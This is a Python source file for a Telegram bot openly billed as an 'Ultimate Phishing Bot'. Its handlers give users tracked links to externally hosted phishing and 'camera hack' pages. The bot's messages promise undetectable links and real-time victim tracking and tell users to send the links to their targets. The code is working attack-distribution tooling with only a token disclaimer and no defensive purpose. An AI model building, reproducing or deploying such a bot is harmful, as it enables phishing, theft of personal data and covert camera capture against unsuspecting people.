import os
import asyncio
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# 🔐 API Credentials
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")

# 🚀 Initialize the Bot
app = Client("vip_phishing_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# 🎭 Start Command Handler
@app.on_message(filters.private & filters.command("start"))
async def start_command(client, message):
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✨ ALL-IN-ONE ✨", callback_data="all_in_one"),
            InlineKeyboardButton("📸 CAM HACK 📸", callback_data="camera_hack")
        ]
    ])
    
    welcome_text = (
        "<b><i>🔰 Welcome to the Ultimate Phishing Bot! 🔰</i></b>\n\n"
        
        "<b>🔥 Generate undetectable phishing links in seconds & send them to your targets!</b>\n"
        
        "<b>🎯 Track victims in real-time & collect data effortlessly.</b>\n\n"
        
        "<b>🛑 Warning: High Security System Activated 🛑</b>\n\n"
        "<i>⚠️ Use responsibly! Any misuse is your own responsibility. ⚠️</i>"
    )

    await message.reply_text(welcome_text, reply_markup=keyboard, parse_mode=enums.ParseMode.HTML)

# 🔄 Callback Query Handler with Dynamic Loading Animation
@app.on_callback_query()
async def callback_handler(client, callback_query):
    user_id = callback_query.from_user.id
    data = callback_query.data

    # 🌐 Generate Phishing Links
    links = {
        "all_in_one": ("✨ ALL-IN-ONE ATTACK ✨", f"https://trail-charm-waterlily.glitch.me/?id={user_id}"),
        "camera_hack": ("📸 CAMERA HACK 📸", f"https://four-political-blouse.glitch.me/?id={user_id}")
    }

    if data in links:
        page_name, link = links[data]

        # ⏳ Send Dynamic Loading Animation
        loading_stages = [
            "🚀 𝐒", "🚀 𝐒𝐓", "🚀 𝐒𝐓𝐀", "🚀 𝐒𝐓𝐀𝐑", "🚀 𝐒𝐓𝐀𝐑𝐓",
            "🚀 𝐒𝐓𝐀𝐑𝐓𝐈", "🚀 𝐒𝐓𝐀𝐑𝐓𝐈𝐍", "🚀 𝐒𝐓𝐀𝐑𝐓𝐈𝐍𝐆... 🔥"
        ]
        loading_message = await callback_query.message.reply_text("🚀 𝐒", parse_mode=enums.ParseMode.HTML)

        for stage in loading_stages[1:]:
            await asyncio.sleep(0.1)
            await loading_message.edit_text(stage)

        await asyncio.sleep(0.1)  # Short pause before deleting the loading message
        await loading_message.delete()

        # 📝 Send the Generated Link with Copy Button
        message_text = (
            f"✨ <b>Page Name:</b> <i>{page_name}</i>\n"
            f"🔗 <b>Link:</b> <code>{link}</code>\n\n"
            f"🎯 <b>Just send this to your target!</b>"
        )

        copy_button = InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 🔥 Copy Link 🔥 📋", callback_data=f"copy|{user_id}|{data}")]
        ])

        await callback_query.message.reply_text(
            message_text, reply_markup=copy_button, parse_mode=enums.ParseMode.HTML
        )
    else:
        await callback_query.answer("❌ Invalid selection!", show_alert=True)

# 📋 Copy Link Handler (🔥 Fixed Issue!)
@app.on_callback_query(filters.regex("^copy\\|"))
async def copy_link_handler(client, callback_query):
    try:
        _, user_id, data = callback_query.data.split("|")  # Extract user_id and data
        user_id = int(user_id)  # Convert user_id back to integer
        
        links = {
            "all_in_one": f"https://trail-charm-waterlily.glitch.me/?id={user_id}",
            "camera_hack": f"https://four-political-blouse.glitch.me/?id={user_id}"
        }

        if data in links:
            link = links[data]
            await callback_query.answer(f"📋 Copied: {link}", show_alert=True)
        else:
            await callback_query.answer("❌ Link not found!", show_alert=True)
    
    except Exception as e:
        await callback_query.answer("⚠️ Error copying link!", show_alert=True)

# 🚀 Run the Bot
if __name__ == "__main__":
    app.run()
